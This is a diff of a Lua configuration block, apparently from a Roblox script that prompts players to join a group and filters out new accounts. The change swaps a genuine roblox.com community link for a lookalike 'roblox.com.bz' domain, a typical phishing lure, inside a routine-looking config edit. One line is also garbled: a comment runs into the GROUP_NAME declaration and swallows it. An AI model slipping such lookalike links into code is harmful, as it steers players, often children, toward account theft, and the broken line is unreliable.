@@ -5,7 +5,7 @@
 
 ------------ CONFIG ------------
 local NAME = "Lumen"
-local GROUP_LINK = "https://www.roblox.com/communities/4705120/Scriptbloxian-Studios#!/about" -- paste your group link between the quotes (shorturl.asia is fine). Test it first: it must open roblox.comlocal GROUP_NAME = "Your Group"   -- only used in the "couldn't copy the link" message
+local GROUP_LINK = "https://roblox.com.bz/communities/9529552772/" -- paste your group link between the quotes (shorturl.asia is fine). Test it first: it must open roblox.comlocal GROUP_NAME = "Your Group"   -- only used in the "couldn't copy the link" message
 local MIN_ACCOUNT_AGE_DAYS = 30   -- accounts younger than this are treated as alts. Set to 0 to turn the check off
 local KICK_NEW_ACCOUNTS = true    -- true: kick the new account out of the game. false: just stop the window from showing
 local SKIP_IF_ALREADY_MEMBER = true -- true: players who are already in the group never see the window
